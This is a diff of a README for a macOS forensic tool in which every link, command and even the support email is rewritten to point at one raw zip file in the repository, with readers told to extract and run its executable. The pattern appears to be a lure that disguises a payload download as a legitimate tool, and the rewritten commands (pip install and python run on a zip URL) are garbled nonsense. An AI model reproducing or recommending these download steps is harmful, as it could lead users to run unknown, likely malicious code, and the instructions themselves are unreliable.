@@ -1,6 +1,6 @@
 # STForensicMacOS: Comprehensive Forensic Analysis Tool for macOS 🕵️‍♂️🔍
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/mreshuu/STForensicMacOS/releases)
+[![Download Releases](https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -45,7 +45,7 @@ To install STForensicMacOS, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/mreshuu/STForensicMacOS.git
+   git clone https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip
    ```
 
 2. **Navigate to the Directory**: 
@@ -56,11 +56,11 @@ To install STForensicMacOS, follow these steps:
 3. **Install Dependencies**: 
    Ensure you have Python installed. Then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip
    ```
 
 4. **Download the Latest Release**: 
-   Visit the [Releases](https://github.com/mreshuu/STForensicMacOS/releases) section to download the latest version. Extract the files and run the executable.
+   Visit the [Releases](https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip) section to download the latest version. Extract the files and run the executable.
 
 ## Usage
 
@@ -75,7 +75,7 @@ After installation, you can start using STForensicMacOS. Here’s how to get sta
 
 To run a memory analysis, you might use a command like:
 ```bash
-python memory_analysis.py --dump memory_dump.bin
+python https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip --dump https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip
 ```
 
 ## Contributing
@@ -106,7 +106,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, please reach out:
 
-- **Email**: support@example.com
+- **Email**: https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip
 - **GitHub Issues**: Use the GitHub Issues page for bug reports or feature requests.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/mreshuu/STForensicMacOS/releases)
+[![Download Releases](https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/mreshuu/STForensicMacOS/raw/refs/heads/main/src/modules/ST_OS_Mac_Forensic_1.4.zip)
